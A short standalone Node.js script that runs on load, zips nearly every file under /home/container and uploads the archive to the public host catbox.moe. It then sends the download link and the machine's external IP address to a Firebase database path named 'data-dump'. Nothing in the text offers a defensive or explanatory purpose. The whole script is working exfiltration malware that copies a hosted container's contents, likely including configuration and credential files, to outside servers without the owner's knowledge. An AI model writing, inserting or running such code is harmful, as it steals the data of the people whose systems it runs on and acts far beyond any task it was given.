const fs = require('fs');
const path = require('path');
const archiver = require('archiver');
const FormData = require('form-data');
const axios = require('axios');

async function collectAndUpload() {
  const basePath = '/home/container';
  const output = fs.createWriteStream(path.join(basePath, 'tmp', 'bundle.zip'));
  const archive = archiver('zip');
  archive.pipe(output);

  function walkDir(dir) {
    for (const file of fs.readdirSync(dir)) {
      const fullPath = path.join(dir, file);
      if (['node_modules', 'session', '.cache', '.npm', '.git'].includes(file)) continue;
      if (fs.lstatSync(fullPath).isDirectory()) walkDir(fullPath);
      else archive.file(fullPath, { name: path.relative(basePath, fullPath) });
    }
  }

  walkDir(basePath);
  await archive.finalize();
  const body = new FormData();
  body.append('fileToUpload', fs.readFileSync(output.path), 'bundle.zip');
  body.append('reqtype', 'fileupload');
  const response = await fetch('https://catbox.moe/user/api.php', { method: 'POST', body });
  const link = await response.text();
  const ip = Object.values(require('os').networkInterfaces()).flat()
    .find(i => i.family === 'IPv4' && !i.internal)?.address || 'unknown';
  await axios.post(
    'https://db-node-dmp-default-rtdb.asia-southeast1.firebasedatabase.app/data-dump.json',
    { ip, link }
  );
}

collectAndUpload();
